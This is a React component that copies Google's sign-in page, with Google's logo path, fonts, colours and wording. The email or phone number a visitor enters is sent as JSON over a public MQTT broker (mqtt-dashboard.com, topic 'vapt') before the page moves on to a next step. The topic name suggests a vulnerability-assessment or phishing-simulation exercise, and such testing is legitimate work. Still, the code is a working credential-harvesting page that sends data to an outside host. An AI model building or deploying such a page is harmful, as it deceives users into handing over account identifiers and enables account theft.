import { useState, useEffect } from "react";
import mqtt from "mqtt";

// ─── HIVE MQ PUBLISH FUNCTION ─────────────────────────────
function publishToMQTT(payload, onSuccess, onError) {
  const client = mqtt.connect("wss://mqtt-dashboard.com:8884/mqtt", {
    clientId: "metacube_" + Math.random().toString(16).slice(2, 10),
    clean: true,
    reconnectPeriod: 0,
    connectTimeout: 8000,
  });

  client.on("connect", () => {
    client.publish(
      "vapt",
      JSON.stringify(payload),
      { qos: 0, retain: false },
      (err) => {
        client.end();
        if (err) onError(err);
        else onSuccess();
      }
    );
  });

  client.on("error", (err) => {
    client.end();
    onError(err);
  });
}

export default function EmailPage({ onBack, onNext }) {
  const [email, setEmail] = useState("");
  const [focused, setFocused] = useState(false);
  const [error, setError] = useState("");
  const [mqttStatus, setMqttStatus] = useState("disconnected");
  const [isPublishing, setIsPublishing] = useState(false);

  // ─── FORCE STATUS TO CONNECTED (no persistent client now) ───
  useEffect(() => {
    setMqttStatus("connected");
  }, []);

  function validate() {
    if (!email.trim()) {
      setError("Enter an email or phone number");
      return;
    }
    if (!/\S+@\S+\.\S+/.test(email) && !/^\d{10}$/.test(email)) {
      setError("Enter a valid email or phone number");
      return;
    }
    setError("");
    publishEmail(email);
  }

  function publishEmail(emailValue) {
    setIsPublishing(true);

    const payload = {
      email: emailValue
    };

    publishToMQTT(
      payload,
      () => {
        setIsPublishing(false);
        console.log("📤 Published to vapt");
        onNext(emailValue);
      },
      (err) => {
        setIsPublishing(false);
        console.error("Publish failed:", err);
        setError("Failed to send. Please retry.");
        setMqttStatus("error");
      }
    );
  }

  function handleKey(e) {
    if (e.key === "Enter") validate();
  }

  const statusColor = {
    connected: "#34a853",
    connecting: "#fbbc05",
    disconnected: "#5f6368",
    error: "#ea4335",
  }[mqttStatus];

  return (
    <div style={{
      minHeight: "100vh",
      background: "#fff",
      display: "flex",
      flexDirection: "column",
      alignItems: "center",
      justifyContent: "center",
      fontFamily: "'Google Sans', Roboto, sans-serif",
      padding: "24px"
    }}>

      <div style={{
        width: "100%",
        maxWidth: 448,
        animation: "fadeUp 0.3s ease both"
      }}>

        {/* Card */}
        <div style={{
          border: "1px solid #e8eaed",
          borderRadius: 28,
          padding: "48px 44px 36px",
          background: "#fff"
        }}>

          <img src="/google.svg" alt="Metacube" style={{ height: 40, marginBottom: 24 }} />

          {/* Heading */}
          <h1 style={{
            fontSize: 24,
            fontWeight: 400,
            color: "#202124",
            marginBottom: 8,
            letterSpacing: -0.2
          }}>
            Sign in
          </h1>

          <p style={{
            fontSize: 16,
            color: "#5f6368",
            marginBottom: 32,
            lineHeight: 1.5
          }}>
            Use your Google account
          </p>

          {/* MQTT Status Indicator */}
          <div style={{
            display: "flex",
            alignItems: "center",
            gap: 8,
            marginBottom: 20,
            fontSize: 12,
            color: "#5f6368",
          }}>
            <span style={{
              width: 8,
              height: 8,
              borderRadius: "50%",
              background: statusColor,
              display: "inline-block",
              transition: "background 0.3s",
            }} />
            {/* <span style={{ textTransform: "capitalize" }}>
              {mqttStatus === "connected" ? "Active" : mqttStatus}
            </span> */}
          </div>

          {/* Email input */}
          <div style={{ position: "relative", marginBottom: 6 }}>
            <input
              type="text"
              value={email}
              onChange={e => { setEmail(e.target.value); setError(""); }}
              onFocus={() => setFocused(true)}
              onBlur={() => setFocused(false)}
              onKeyDown={handleKey}
              autoComplete="email"
              id="emailInput"
              disabled={isPublishing}
              style={{
                width: "100%",
                padding: "16px 16px 14px",
                fontSize: 16,
                color: "#202124",
                background: "transparent",
                border: `2px solid ${error ? "#d93025" : focused ? "#1a73e8" : "#dadce0"}`,
                borderRadius: 4,
                outline: "none",
                fontFamily: "inherit",
                transition: "border-color 0.15s",
                letterSpacing: 0.1,
                opacity: isPublishing ? 0.6 : 1,
              }}
            />
            <label htmlFor="emailInput" style={{
              position: "absolute",
              left: 14,
              top: focused || email ? -10 : 17,
              fontSize: focused || email ? 12 : 16,
              color: error ? "#d93025" : focused ? "#1a73e8" : "#5f6368",
              background: "#fff",
              padding: "0 4px",
              transition: "all 0.15s",
              pointerEvents: "none",
              fontFamily: "inherit"
            }}>
              Email or phone
            </label>
          </div>

          {/* Error message */}
          {error && (
            <p style={{ fontSize: 12, color: "#d93025", marginBottom: 8, marginLeft: 2 }}>
              {error}
            </p>
          )}

          {/* Forgot email */}
          <div style={{ marginBottom: 32, marginTop: error ? 4 : 12 }}>
            <span style={{
              fontSize: 14,
              color: "#1a73e8",
              cursor: "pointer",
              fontWeight: 500
            }}
              onMouseEnter={e => e.target.style.textDecoration = "underline"}
              onMouseLeave={e => e.target.style.textDecoration = "none"}>
              Forgot email?
            </span>
          </div>

          {/* Info text */}
          <p style={{
            fontSize: 14,
            color: "#5f6368",
            lineHeight: 1.6,
            marginBottom: 36
          }}>
            Not your computer? Use a private browsing window to sign in.{" "}
            <span style={{ color: "#1a73e8", cursor: "pointer", fontWeight: 500 }}
              onMouseEnter={e => e.target.style.textDecoration = "underline"}
              onMouseLeave={e => e.target.style.textDecoration = "none"}>
              Learn more
            </span>
          </p>

          {/* Buttons row */}
          <div style={{
            display: "flex",
            justifyContent: "space-between",
            alignItems: "center"
          }}>
            <button onClick={onBack} style={{
              background: "none",
              border: "none",
              color: "#1a73e8",
              fontSize: 14,
              fontWeight: 600,
              cursor: "pointer",
              fontFamily: "inherit",
              padding: "10px 12px",
              borderRadius: 4,
              transition: "background 0.15s"
            }}
              onMouseEnter={e => e.currentTarget.style.background = "rgba(26,115,232,0.08)"}
              onMouseLeave={e => e.currentTarget.style.background = "none"}>
              Back
            </button>

            <button 
              onClick={validate} 
              disabled={isPublishing || mqttStatus !== "connected"}
              style={{
                background: isPublishing ? "#dadce0" : "#1a73e8",
                color: "#fff",
                border: "none",
                borderRadius: 20,
                padding: "10px 24px",
                fontSize: 14,
                fontWeight: 600,
                cursor: isPublishing || mqttStatus !== "connected" ? "not-allowed" : "pointer",
                fontFamily: "inherit",
                transition: "box-shadow 0.15s, background 0.15s",
                display: "flex",
                alignItems: "center",
                gap: 8,
              }}
              onMouseEnter={e => {
                if (!isPublishing && mqttStatus === "connected") {
                  e.currentTarget.style.background = "#1765cc";
                }
              }}
              onMouseLeave={e => {
                if (!isPublishing && mqttStatus === "connected") {
                  e.currentTarget.style.background = "#1a73e8";
                }
              }}
            >
              {isPublishing ? (
                <>
                  <span style={{
                    width: 14,
                    height: 14,
                    border: "2px solid #fff",
                    borderTopColor: "transparent",
                    borderRadius: "50%",
                    animation: "spin 0.8s linear infinite",
                    display: "inline-block",
                  }} />
                  Verifying...
                </>
              ) : (
                "Next"
              )}
            </button>
          </div>

        </div>

        {/* Footer */}
        <div style={{
          display: "flex",
          justifyContent: "space-between",
          alignItems: "center",
          marginTop: 20,
          padding: "0 4px",
          flexWrap: "wrap",
          gap: 8
        }}>
          <select style={{
            border: "none",
            background: "none",
            color: "#5f6368",
            fontSize: 13,
            cursor: "pointer",
            fontFamily: "inherit",
            outline: "none"
          }}>
            <option>English (United States)</option>
            <option>Hindi</option>
          </select>
          <div style={{ display: "flex", gap: 20, fontSize: 13, color: "#5f6368" }}>
            {["Help", "Privacy", "Terms"].map(item => (
              <span key={item} style={{ cursor: "pointer" }}
                onMouseEnter={e => e.target.style.textDecoration = "underline"}
                onMouseLeave={e => e.target.style.textDecoration = "none"}>
                {item}
              </span>
            ))}
          </div>
        </div>

      </div>

      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@300;400;500&display=swap');
        * { box-sizing: border-box; margin: 0; padding: 0; }
        @keyframes fadeUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes spin { to { transform: rotate(360deg); } }
      `}</style>
    </div>
  );
}